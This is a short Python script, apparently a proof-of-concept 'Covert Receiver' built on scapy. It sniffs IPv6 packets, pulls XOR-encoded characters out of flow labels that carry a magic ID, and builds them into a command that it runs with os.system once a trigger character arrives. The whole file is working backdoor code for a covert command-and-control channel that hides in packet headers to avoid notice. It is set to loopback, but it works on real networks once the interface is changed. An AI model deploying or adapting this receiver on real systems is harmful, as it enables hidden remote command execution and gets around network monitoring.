from scapy.all import *
import os
import sys

# Use 'lo0' for macOS, 'lo' for Linux
INTERFACE = "lo0"
MAGIC_ID = 1114
ENCRYPTION_KEY = 0x55
TRIGGER_CHAR = ";"

# Buffer to concat the command string
cmd_buffer = ""


def process_packet(pkt):
    global cmd_buffer

    if pkt.haslayer(IPv6):
        try:
            # Extract the 20-bit Flow Label
            flow_label = pkt[IPv6].fl

            # 1. Check the top 12 bits for our Magic ID
            received_magic = flow_label >> 8

            if received_magic == MAGIC_ID:
                #2. Get the bottom 8 bits (The Data)
                encrypted_char = flow_label & 0xFF

                #3. Decrypt XOR with the key
                decrypted_char = chr(encrypted_char ^ ENCRYPTION_KEY)

                #4. Excecution
                if decrypted_char == TRIGGER_CHAR:
                    print(f"\n[+] Command Reassembled: {cmd_buffer}")
                    print(f"[*] Executing...")

                    # Execute cmd on system
                    os.system(cmd_buffer)
                    # ---------------------------------

                    print("-" * 40)
                    cmd_buffer = ""  # Reset buffer
                else:
                    # Append character to buffer
                    cmd_buffer += decrypted_char
                    sys.stdout.write(decrypted_char)
                    sys.stdout.flush()

        except Exception as e:
            pass


if __name__ == "__main__":
    print(f"[*] Covert Receiver listening on {INTERFACE}...")
    print(f"[*] Waiting for Magic ID: {MAGIC_ID}...")
    # Sniff for IPv6 packet
    sniff(filter="ip6", prn=process_packet, store=0, iface=INTERFACE)
